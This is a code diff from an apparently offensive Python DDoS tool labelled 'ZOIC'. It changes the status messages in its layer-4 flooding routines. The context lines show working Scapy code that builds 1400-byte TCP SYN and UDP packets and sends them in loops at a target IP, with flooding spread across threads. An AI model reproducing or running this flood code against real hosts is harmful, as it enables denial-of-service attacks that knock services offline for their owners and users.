@@ -59,7 +59,7 @@ def layer4():
                     byte = Raw(load='X' * 1400)
                     pkt = ip / tcp / byte
                     send(pkt, verbose=0)
-                    print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] DDoS Attack !! >> {target_ip}"))
+                    print(Colorate.Horizontal(Colors.cyan_to_green, f"[+] IP Address {target_ip} [*] SYN Packet : {pkt.summary()}"))
                     time.sleep(0.01)
 
             def start_flooding(target_ip, target_port, thread_count):
@@ -91,7 +91,7 @@ def layer4():
                     byte = Raw(load='X' * 1400)
                     pkt = ip / udp / byte
                     send(pkt, verbose=0)
-                    print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] DDoS Attack !! >> {target_ip}"))
+                    print(Colorate.Horizontal(Colors.cyan_to_green, f"[+] IP Address {target_ip} [*] UDP Packet : {pkt.summary()}"))
                     time.sleep(0.01)
 
             def start_flooding(target_ip, target_port, thread_count):
